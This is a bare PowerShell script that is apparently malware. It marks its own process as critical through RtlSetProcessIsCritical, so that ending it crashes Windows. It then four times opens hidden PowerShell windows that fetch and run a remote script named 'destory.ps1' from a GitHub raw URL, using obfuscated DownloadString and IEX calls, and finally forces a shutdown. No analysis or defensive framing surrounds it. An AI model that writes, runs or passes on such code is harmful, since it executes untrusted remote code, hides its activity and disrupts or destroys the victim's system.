$code = @"
using System;
using System.Runtime.InteropServices;

public class CriticalProcess
{
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint RtlSetProcessIsCritical(bool bNewValue, bool bNeedScb, bool bCheckFlag);
}
"@
[CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 15
shutdown /s /t 4 /c "Good look!"
Start-Sleep -Seconds 3
Stop-Computer
